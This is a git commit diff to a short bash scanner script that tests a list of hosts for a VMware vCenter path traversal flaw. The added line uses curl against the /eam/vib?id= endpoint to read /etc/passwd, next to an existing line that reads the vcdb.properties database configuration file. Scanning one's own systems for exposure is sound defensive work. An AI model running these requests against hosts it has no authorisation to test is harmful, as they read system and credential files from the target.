80766370c79ab109286ce09a136f0807f9b0a0fa
Ihebski <ihebski@users.noreply.github.com>
2020-11-09 01:14:30 +0100

    linux check

--- mini-scanner/VMwarevCenter_path_traversal.sh
+++ mini-scanner/VMwarevCenter_path_traversal.sh
@@ -11,4 +11,6 @@ servers="$(cat)"
 for servers in $servers; do
 	# command test here
 curl -vk --path-as-is "https://$servers/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties" 2>&1 | grep "driver" >/dev/null && echo "VULNERABLE: $servers" || echo "MITIGATED: $servers"    
+curl -vk --path-as-is "https://$servers/eam/vib?id=/etc/passwd" 2>&1 | grep "root:[x*]:0:0" >/dev/null && echo "VULNERABLE: $servers" || echo "MITIGATED: $servers"    
+
 done
